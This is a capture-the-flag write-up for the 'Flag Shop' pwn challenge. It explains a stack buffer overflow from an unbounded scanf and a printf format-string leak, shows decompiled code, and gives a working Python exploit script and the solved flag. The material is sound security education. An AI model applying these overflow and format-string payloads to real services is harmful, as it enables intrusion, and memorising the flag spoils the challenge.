# Flag Shop
> ### Category: pwn
>
> Welcome to the SECURE shop, where your goal is to explore the platform and uncover the secrets hidden within. After creating a user account, you'll interact with different features of the system. However, the admin panel remains restricted, and your challenge is to figure out how to access it.
>
> `nc 2024.sunshinectf.games 24001`
>
> ### Attachments
> `flagshop`

## Overview
The application first asks you to create an account (you provide pronouns and username, and the application sets an "is admin" flag to 0) and then allows you to print your info or display admin panel (choosing this option also terminates the program).

## Buffer Overflow
Consider the following fragments of decompiled code from `main`:
```c
void main(void) {
  int iVar1;
  char choice [2];
  account account;

  // create the account
  ...

  do {
    printf(banner);
    iVar1 = __isoc99_scanf("%s",choice);
    // perform an operation based on user's choice
    ...
  } while( true );
}
```

The buffer for `choice` is only 2 characters, but the call to `scanf` doesn't limit the number of characters read. Looking at the layout of local variables of `main`:
```
                undefined main()
undefined         AL:1           <RETURN>
account           Stack[-0x28]   account
undefined2        Stack[-0x2a]:2 choice
```
`choice` is stored in a lower address than `account`, so it's possible to overflow values of `account` (pronouns - 8 bytes, username - 16 bytes and the "is admin" flag - 4 bytes) using this `scanf` call.

## Format string vulnerability
Now take a look at `load_panel` function:
```c
void load_panel(account *account) {
  void *__ptr;
  
  clear();
  if (account->is_admin == 0) {
    printf("\x1b[31m\n[ Access Denied! ]\n\x1b[m");
    return;
  }
  __ptr = (void *)read_flag("flag.txt");
  printf("\x1b[32m[ SUCCESS! Here\'s your flag current user: ");
  printf(account->username);
  free(__ptr);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
If the account is marked as `admin` (which is possible to do using the BOF), this function will store a pointer to the flag in a local variable and call `printf` on the username. This call introduces a format string vulnerability, which will make it possible to print the flag. Let's look at the layout of local variables in this function as well:
```
                undefined __stdcall load_panel(account * account)
undefined         AL:1           <RETURN>
account *         RDI:8          account
undefined8        Stack[-0x10]:8 local_10 
undefined8        Stack[-0x20]:8 local_20  
                load_panel
001015a1 f3 0f 1e fa     ENDBR64
001015a5 55              PUSH       RBP
001015a6 48 89 e5        MOV        RBP,RSP
001015a9 48 83 ec 20     SUB        RSP,0x20

...

001015de 48 89 c7        MOV        RDI,RAX
001015e1 e8 50 fd ff ff  CALL       read_flag
001015e6 48 89 45 f8     MOV        qword ptr [RBP + local_10],RAX
```
The pointer to the flag is stored at `rbp + local_10` (`rbp - 0x10`) which is `rsp + 0x10` (so as the 3rd quadword on the stack), therefore it will be passed to `printf` as the 3rd stack argument, which is 9th argument in general (excluding the format string). Thus, it can be printed by using `"%9$s"` format specifier.

## The exploit
The following code exploits both of the vulnerabilities and prints the flag:
```py
from gdb_plus import *

dbg = Debugger('./flagshop', script='init-gef').remote('2024.sunshinectf.games', 24001)

io = dbg.p

dbg.c(wait=False)

io.sendlineafter(b'username ]', b'foo')
io.sendlineafter(b'pronouns ]', b'bar')

payload = b'1'
payload += b'X' # padding (1 additional byte of the `choice` buffer)
payload += b'A' * 8 # pronouns (8 bytes)
username = b'%9$s' # format string to print the 9th argument (or 3rd stack argument) as a string
payload += username
payload += b'B' * (16 - len(username)) # username (16 bytes)
payload += b'*' # 1st byte of admin flag

io.sendlineafter(b'==========================================\n', payload)

log.info(io.recvall().decode())
```

## Flag
`sun{c@n_st1ll_r3@d_off_the_he@p_fr0m_st@ck_po!nters!}`